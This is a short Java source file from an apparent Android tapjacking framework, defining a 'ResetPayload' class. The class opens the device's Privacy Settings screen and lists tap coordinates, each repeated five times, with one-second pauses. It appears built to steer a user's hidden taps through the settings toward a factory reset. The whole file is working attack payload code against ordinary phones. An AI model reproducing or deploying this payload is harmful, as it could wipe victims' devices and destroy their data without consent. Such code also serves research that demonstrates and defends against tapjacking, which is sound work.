package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.graphics.Point;
import android.provider.Settings;

public class ResetPayload extends FrameworkPayload {
	public ResetPayload() {
		for(int i=0; i<=4; i++) 
			positions.add(new Point(45, 410));
		for(int i=0; i<=4; i++)
			positions.add(new Point(230, 610));
		for(int i=0; i<=4; i++)
			positions.add(new Point(180, 240));
	}

	public Intent getIntent() {
		Intent intent = new Intent(Settings.ACTION_PRIVACY_SETTINGS);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

		return intent;
	}

	@Override
	public int getSleep() {
		return 1000;
	}
}